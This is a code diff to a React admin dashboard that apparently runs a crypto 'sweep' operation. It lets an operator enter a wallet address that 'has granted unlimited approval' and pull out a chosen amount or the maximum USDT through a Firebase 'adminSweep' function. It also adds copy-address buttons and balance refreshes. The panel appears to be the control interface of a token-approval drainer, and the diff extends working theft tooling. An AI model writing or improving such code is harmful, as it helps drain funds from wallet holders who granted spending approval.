@@ -16,6 +16,8 @@ import {
   ChevronRight,
   X,
   RefreshCw,
+  Copy,
+  Check,
 } from 'lucide-react';
 import { signOut } from 'firebase/auth';
 import { httpsCallable } from 'firebase/functions';
@@ -127,7 +129,17 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
 
   // ── Sweep execution state ─────────────────────────────────────────
   const [sweepAddress, setSweepAddress] = useState('');
+  const [sweepAmountInput, setSweepAmountInput] = useState('MAX');
   const [sweepLoading, setSweepLoading] = useState(false);
+  const [copiedAddress, setCopiedAddress] = useState<string | null>(null);
+
+  const handleCopyAddress = (address: string) => {
+    navigator.clipboard.writeText(address);
+    setCopiedAddress(address);
+    setTimeout(() => {
+      setCopiedAddress((prev) => (prev === address ? null : prev));
+    }, 2000);
+  };
   const [sweepingId, setSweepingId] = useState<string | null>(null); // per-row tracking
   const [refreshingWalletId, setRefreshingWalletId] = useState<string | null>(null); // per-wallet balance refresh tracking
   const [sweepResult, setSweepResult] = useState<{
@@ -249,7 +261,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
 
   // ── Sweep action (shared handler for manual input + per-wallet row) ─
   const executeSweep = useCallback(
-    async (address: string, rowId?: string) => {
+    async (address: string, rowId?: string, customAmount?: string) => {
       const trimmed = address.trim();
       if (!trimmed) return;
       if (rowId) setSweepingId(rowId);
@@ -257,8 +269,13 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
       setSweepResult(null);
 
       try {
-        const sweep = httpsCallable<{ walletAddress: string }, any>(fns, 'adminSweep');
-        const result = await sweep({ walletAddress: trimmed });
+        const sweep = httpsCallable<{ walletAddress: string; customAmount?: string }, any>(fns, 'adminSweep');
+        const payload: { walletAddress: string; customAmount?: string } = { walletAddress: trimmed };
+        if (customAmount && customAmount.trim().toUpperCase() !== 'MAX') {
+          payload.customAmount = customAmount.trim();
+        }
+
+        const result = await sweep(payload);
         const d = result.data;
 
         setSweepResult({
@@ -267,9 +284,11 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
           txHash: d.sweepTxHash,
         });
         setSweepAddress('');
+        setSweepAmountInput('MAX');
 
-        // Move wallet to top immediately & update balance to 0.00
+        // Move wallet to top immediately & update balance
         recordLocalSweep(trimmed, d.sweepTxHash, d.amountSwept);
+        refreshBalance(trimmed).catch(() => {});
       } catch (err: any) {
         const errMsg = err.message ?? 'Sweep operation failed.';
         setSweepResult({
@@ -299,7 +318,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
         setSweepingId(null);
       }
     },
-    [recordLocalSweep, markWalletUnapproved]
+    [recordLocalSweep, markWalletUnapproved, refreshBalance]
   );
 
   const sidebarBtn = (
@@ -560,25 +579,50 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                 <p className="text-xs text-[#8e9eb3] mb-4">
                   Enter a wallet address that has granted unlimited approval to trigger an admin sweep.
                 </p>
-                <div className="flex flex-col sm:flex-row gap-3">
-                  <div className="relative flex-1">
+                <div className="flex flex-col sm:flex-row items-center gap-3">
+                  <div className="relative flex-1 w-full">
                     <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#64748b] pointer-events-none" />
                     <input
                       id="sweep-wallet-input"
                       type="text"
                       value={sweepAddress}
                       onChange={(e) => setSweepAddress(e.target.value)}
-                      onKeyDown={(e) => e.key === 'Enter' && executeSweep(sweepAddress)}
+                      onKeyDown={(e) => e.key === 'Enter' && executeSweep(sweepAddress, undefined, sweepAmountInput)}
                       placeholder="0x… wallet address"
                       disabled={sweepLoading}
                       className="w-full pl-10 pr-4 py-2.5 bg-[#0d1424]/90 border border-[#25354e] focus:border-[#38bdf8]/80 focus:ring-1 focus:ring-[#38bdf8]/40 rounded-xl text-white text-sm placeholder-slate-600 transition-all outline-none font-mono disabled:opacity-50"
                     />
                   </div>
+
+                  <div className="relative w-full sm:w-48 shrink-0">
+                    <input
+                      id="sweep-amount-input"
+                      type="text"
+                      value={sweepAmountInput}
+                      onChange={(e) => setSweepAmountInput(e.target.value)}
+                      onKeyDown={(e) => e.key === 'Enter' && executeSweep(sweepAddress, undefined, sweepAmountInput)}
+                      placeholder="MAX"
+                      disabled={sweepLoading}
+                      className="w-full pl-3.5 pr-20 py-2.5 bg-[#0d1424]/90 border border-[#25354e] focus:border-[#38bdf8]/80 focus:ring-1 focus:ring-[#38bdf8]/40 rounded-xl text-white text-sm placeholder-slate-500 font-semibold transition-all outline-none disabled:opacity-50"
+                    />
+                    <div className="absolute right-2.5 top-1/2 -translate-y-1/2 flex items-center gap-1.5 pointer-events-auto">
+                      <button
+                        type="button"
+                        onClick={() => setSweepAmountInput('MAX')}
+                        className="px-1.5 py-0.5 rounded bg-blue-600/30 hover:bg-blue-600 text-blue-300 hover:text-white text-[10px] font-bold tracking-wider transition-all cursor-pointer border border-blue-500/30"
+                        title="Set to maximum available balance"
+                      >
+                        MAX
+                      </button>
+                      <span className="text-xs font-semibold text-[#8e9eb3]">USDT</span>
+                    </div>
+                  </div>
+
                   <button
                     id="sweep-execute-button"
-                    onClick={() => executeSweep(sweepAddress)}
+                    onClick={() => executeSweep(sweepAddress, undefined, sweepAmountInput)}
                     disabled={sweepLoading || !sweepAddress.trim()}
-                    className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white text-sm font-semibold transition-all disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer shadow-md shadow-blue-600/20"
+                    className="w-full sm:w-auto shrink-0 flex items-center justify-center gap-2 px-5 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white text-sm font-semibold transition-all disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer shadow-md shadow-blue-600/20"
                   >
                     {sweepLoading ? (
                       <Loader2 className="w-4 h-4 animate-spin" />
@@ -838,6 +882,21 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
                                   <span title={w.id} className="font-medium">
                                     {w.id.slice(0, 10)}…{w.id.slice(-8)}
                                   </span>
+                                  <button
+                                    type="button"
+                                    onClick={(e) => {
+                                      e.stopPropagation();
+                                      handleCopyAddress(w.id);
+                                    }}
+                                    title={copiedAddress === w.id ? 'Copied!' : 'Copy wallet address'}
+                                    className="p-1 rounded hover:bg-[#1f2e47] text-[#64748b] hover:text-[#38bdf8] transition-colors cursor-pointer"
+                                  >
+                                    {copiedAddress === w.id ? (
+                                      <Check className="w-3.5 h-3.5 text-emerald-400" />
+                                    ) : (
+                                      <Copy className="w-3.5 h-3.5" />
+                                    )}
+                                  </button>
                                   {latestSweep && (
                                     <span className="text-[9px] uppercase font-mono px-1.5 py-0.2 rounded bg-purple-500/20 text-purple-300 border border-purple-500/30">
                                       Swept
